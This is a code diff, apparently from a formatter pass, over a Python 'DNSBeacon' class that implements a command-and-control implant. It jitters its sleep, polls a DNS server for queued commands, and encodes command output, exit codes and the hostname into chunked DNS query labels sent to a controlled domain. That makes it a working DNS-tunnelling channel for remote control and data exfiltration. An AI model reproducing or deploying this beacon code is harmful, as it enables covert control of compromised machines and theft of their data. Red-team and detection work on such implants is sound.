@@ -77,11 +77,13 @@ class DNSBeacon:
 
     def _jittered_sleep(self):
         import random
+
         jitter = self.sleep_seconds * (random.random() * self.jitter_percent / 100.0)
         time.sleep(self.sleep_seconds + jitter)
 
     def _dns_query(self, name: str, qtype: str = "A") -> list[str]:
         import dns.resolver
+
         resolver = dns.resolver.Resolver()
         if self.dns_server:
             resolver.nameservers = [self.dns_server]
@@ -94,7 +96,7 @@ class DNSBeacon:
     def _build_query(self, msg_type: str, payload: bytes) -> str:
         ts = int(time.time())
         encoded = self._encode(payload)
-        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
+        chunks = [encoded[i : i + 40] for i in range(0, len(encoded), 40)]
         marker = f"{msg_type}.{self.beacon_id}.{ts}"
         if chunks:
             return f"{marker}.{len(chunks)}.{chunks[0]}.{self.domain}"
@@ -107,6 +109,7 @@ class DNSBeacon:
             Command string if one is queued, or None.
         """
         import dns.resolver
+
         resolver = dns.resolver.Resolver()
         if self.dns_server:
             resolver.nameservers = [self.dns_server]
@@ -138,20 +141,23 @@ class DNSBeacon:
             exit_code: Process exit code.
         """
         import dns.resolver
+
         resolver = dns.resolver.Resolver()
         if self.dns_server:
             resolver.nameservers = [self.dns_server]
 
-        result_data = json.dumps({
-            "beacon_id": self.beacon_id,
-            "command": command,
-            "output": output[:2048],
-            "exit_code": exit_code,
-            "hostname": self.hostname,
-        }).encode()
+        result_data = json.dumps(
+            {
+                "beacon_id": self.beacon_id,
+                "command": command,
+                "output": output[:2048],
+                "exit_code": exit_code,
+                "hostname": self.hostname,
+            }
+        ).encode()
 
         encoded = self._encode(result_data)
-        chunks = [encoded[i:i+40] for i in range(0, len(encoded), 40)]
+        chunks = [encoded[i : i + 40] for i in range(0, len(encoded), 40)]
         for idx, chunk in enumerate(chunks):
             query = f"rx.{self.beacon_id}.{idx:04d}.{len(chunks):04d}.{chunk}.{self.domain}"
             if len(query) > 253:
